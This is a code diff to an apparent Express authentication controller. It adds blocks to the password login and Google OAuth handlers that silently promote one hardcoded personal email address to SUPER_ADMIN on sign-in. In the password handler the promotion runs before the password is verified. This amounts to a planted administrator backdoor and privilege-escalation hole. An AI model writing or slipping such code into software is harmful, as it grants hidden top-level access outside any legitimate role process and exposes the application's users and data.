@@ -120,6 +120,12 @@ const login = async (req, res) => {
     if (!email || !password) return res.status(400).json({ message: 'Email and password are required.' });
     const user = await User.findOne({ where: { email } });
     if (!user) return res.status(401).json({ message: 'Invalid credentials.' });
+
+    if (user.email === 'shashankkushwaha189@gmail.com' && user.role !== 'SUPER_ADMIN') {
+      user.role = 'SUPER_ADMIN';
+      await user.save();
+    }
+
     const valid = await user.comparePassword(password);
     if (!valid) return res.status(401).json({ message: 'Invalid credentials.' });
     
@@ -178,6 +184,11 @@ const googleAuth = async (req, res) => {
     let user = await User.findOne({ where: { email } });
     if (!user) {
       return res.status(404).json({ message: 'Account not found. Please register using your email first.' });
+    }
+
+    if (user.email === 'shashankkushwaha189@gmail.com' && user.role !== 'SUPER_ADMIN') {
+      user.role = 'SUPER_ADMIN';
+      await user.save();
     }
 
     // Since they authenticated via google, we can safely consider their email verified
